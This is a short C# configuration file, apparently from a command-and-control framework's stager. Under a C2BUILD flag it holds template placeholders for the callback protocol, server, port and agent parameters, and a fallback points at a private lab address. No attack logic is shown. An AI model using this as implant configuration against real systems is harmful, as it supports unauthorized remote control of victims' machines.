using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Stager
{
    public class Config
    {
#if C2BUILD
        public const string Protocol = "##PROTOCOL##";
        public const string Server = "##SERVER##";
        public const int Port = ##PORT##;

        public const string AgentParams = "##PARAMS##";
#else
        public const string Server = "";
        public const string Protocol = "";
        public const int Port = 0;

        public const string AgentParams = "https:192.168.56.102:443";
#endif

    }
}
